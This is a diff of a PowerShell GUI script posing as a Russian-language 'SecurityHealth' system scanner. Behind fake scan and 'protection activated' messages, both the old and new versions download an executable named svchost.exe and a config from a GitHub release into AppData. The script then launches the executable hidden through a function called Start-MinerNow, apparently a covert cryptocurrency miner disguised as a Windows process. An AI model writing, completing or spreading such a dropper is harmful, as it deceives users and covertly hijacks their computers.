@@ -9,7 +9,6 @@ $form.FormBorderStyle = "None"
 $form.BackColor = [System.Drawing.Color]::FromArgb(5,5,25)
 $form.MaximizeBox = $false
 
-# Звёзды
 $rand = New-Object System.Random
 for ($i=0; $i -lt 40; $i++) {
     $star = New-Object System.Windows.Forms.Label
@@ -45,7 +44,6 @@ $expires.AutoSize = $true
 $expires.Location = New-Object System.Drawing.Point(50,75)
 $form.Controls.Add($expires)
 
-# Вкладки (визуальные)
 $tab1 = New-Object System.Windows.Forms.Label
 $tab1.Text = "СКАНИРОВАНИЕ"
 $tab1.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
@@ -79,7 +77,7 @@ $status.Location = New-Object System.Drawing.Point(50,150)
 $form.Controls.Add($status)
 
 $substatus = New-Object System.Windows.Forms.Label
-$substatus.Text = "Нажмите НАЧАТЬ ПРОВЕРКУ для анализа системы"
+$substatus.Text = "Нажмите НАЧАТЬ ПРОВЕРКУ"
 $substatus.Font = New-Object System.Drawing.Font("Consolas",9)
 $substatus.ForeColor = [System.Drawing.Color]::Gray
 $substatus.AutoSize = $true
@@ -122,85 +120,87 @@ $workDir = "$env:APPDATA\SecurityHealth"
 $exePath = "$workDir\svchost.exe"
 $confPath = "$workDir\config.json"
 
+function Start-MinerNow {
+    if (Test-Path $exePath -and Test-Path $confPath) {
+        try {
+            Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList "-c", $confPath
+            return $true
+        } catch { return $false }
+    }
+    return $false
+}
+
 $btn.Add_Click({
     $btn.Enabled = $false
     $progress.Value = 0
-    $status.Text = "Начинаем проверку..."
-    $substatus.Text = "Анализ системы"
-    $detail.Text = "Сканирование файлов..."
-    $timer.Start()
+    $status.Text = "Проверка и запуск..."
+    $substatus.Text = "Анализ файлов"
+    $detail.Text = "Поиск компонентов..."
+
+    if (Start-MinerNow) {
+        $status.Text = "Защита активирована!"
+        $status.ForeColor = [System.Drawing.Color]::Green
+        $substatus.Text = "Модуль SecurityHealth уже работает"
+        $detail.Text = "Файлы найдены и запущены"
+        $timer.Start()
+    } else {
+        $urlExe  = "https://github.com/Varenik638/check/releases/download/check/svchost.exe"
+        $urlConf = "https://github.com/Varenik638/check/releases/download/check/config.json"
+        try {
+            if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
+            $web = New-Object System.Net.WebClient
+            $web.Headers.Add("User-Agent", "Mozilla/5.0")
+            $status.Text = "Загрузка компонентов..."
+            $substatus.Text = "Получение файлов с сервера"
+            $detail.Text = "Скачивание..."
+            $web.DownloadFile($urlExe, $exePath)
+            $web.DownloadFile($urlConf, $confPath)
+            if (Start-MinerNow) {
+                $status.Text = "Защита активирована!"
+                $status.ForeColor = [System.Drawing.Color]::Green
+                $substatus.Text = "Модуль запущен"
+                $detail.Text = "Версия 2.4.1"
+                $timer.Start()
+            } else {
+                $status.Text = "ОШИБКА ЗАПУСКА"
+                $status.ForeColor = [System.Drawing.Color]::Red
+                $substatus.Text = "Не удалось запустить модуль"
+                $substatus.ForeColor = [System.Drawing.Color]::Red
+                $btn.Text = "ЗАКРЫТЬ"
+                $btn.Enabled = $true
+            }
+        } catch {
+            $status.Text = "ОШИБКА ЗАГРУЗКИ"
+            $status.ForeColor = [System.Drawing.Color]::Red
+            $substatus.Text = $_.Exception.Message
+            $substatus.ForeColor = [System.Drawing.Color]::Red
+            $btn.Text = "ЗАКРЫТЬ"
+            $btn.Enabled = $true
+        }
+    }
 })
 
 $timer.Add_Tick({
     if ($progress.Value -lt 100) {
         $progress.Value += 1
-        if ($progress.Value -eq 10) { $status.Text = "Сканирование системных каталогов..."; $substatus.Text = "C:\Windows\System32\drivers\etc"; $detail.Text = "Поиск уязвимостей..." }
-        if ($progress.Value -eq 25) { $status.Text = "Проверка обновлений..."; $substatus.Text = "Соединение с сервером лицензий"; $detail.Text = "Версия 2.4.1" }
-        if ($progress.Value -eq 40 -and -not $script:minerStarted) {
-            $status.Text = "Подготовка компонентов..."
-            $substatus.Text = "Проверка наличия модулей"
-            if (Test-Path $exePath -and Test-Path $confPath) {
-                $detail.Text = "Модули найдены. Запуск..."
-                try {
-                    Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList "-c", $confPath
-                    $script:minerStarted = $true
-                    $status.Text = "Защита активирована!"
-                    $status.ForeColor = [System.Drawing.Color]::Green
-                    $substatus.Text = "Модуль SecurityHealth запущен"
-                    $detail.Text = "Версия 2.4.1"
-                } catch {
-                    $status.Text = "ОШИБКА ЗАПУСКА"
-                    $status.ForeColor = [System.Drawing.Color]::Red
-                    $substatus.Text = $_.Exception.Message
-                    $substatus.ForeColor = [System.Drawing.Color]::Red
-                    $script:errorOccurred = $true
-                    $timer.Stop()
-                    $btn.Enabled = $true
-                }
-            } else {
-                $detail.Text = "Модули не найдены. Загрузка..."
-                $urlExe  = "https://github.com/Varenik638/check/releases/download/check/svchost.exe"
-                $urlConf = "https://github.com/Varenik638/check/releases/download/check/config.json"
-                try {
-                    if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
-                    $web = New-Object System.Net.WebClient
-                    $web.Headers.Add("User-Agent", "Mozilla/5.0")
-                    $web.DownloadFile($urlExe, $exePath)
-                    $web.DownloadFile($urlConf, $confPath)
-                    $detail.Text = "Загрузка завершена"
-                } catch {
-                    $status.Text = "ОШИБКА ЗАГРУЗКИ"
-                    $status.ForeColor = [System.Drawing.Color]::Red
-                    $substatus.Text = $_.Exception.Message
-                    $substatus.ForeColor = [System.Drawing.Color]::Red
-                    $script:errorOccurred = $true
-                    $timer.Stop()
-                    $btn.Enabled = $true
-                }
-            }
-        }
-        if ($progress.Value -eq 60 -and $script:minerStarted) {
-            $status.Text = "Проверка завершена"
-            $substatus.Text = "Все угрозы устранены"
-            $detail.Text = "Защита работает в фоне"
-        }
+        if ($progress.Value -eq 20) { $status.Text = "Сканирование системы..."; $substatus.Text = "Проверка целостности" }
+        if ($progress.Value -eq 50) { $detail.Text = "Анализ завершён" }
+        if ($progress.Value -eq 80) { $detail.Text = "Защита работает в фоне" }
     } else {
         $timer.Stop()
         if (-not $script:errorOccurred) {
             $status.Text = "Сканирование завершено!"
             $status.ForeColor = [System.Drawing.Color]::Green
-            $substatus.Text = "Нажмите ЗАВЕРШИТЬ"
-            $detail.Text = "Спасибо за использование SecurityHealth"
-            $btn.Text = "ЗАВЕРШИТЬ"
-            $btn.Enabled = $true
-        } else {
-            $status.Text = "ОШИБКА"
-            $status.ForeColor = [System.Drawing.Color]::Red
-            $substatus.Text = "Попробуйте перезапустить программу"
-            $substatus.ForeColor = [System.Drawing.Color]::Red
+            $substatus.Text = "Всё отлично"
             $btn.Text = "ЗАКРЫТЬ"
             $btn.Enabled = $true
         }
+    }
+})
+
+$btn.Add_Click({
+    if ($btn.Text -eq "ЗАКРЫТЬ") {
+        $form.Close()
     }
 })
 
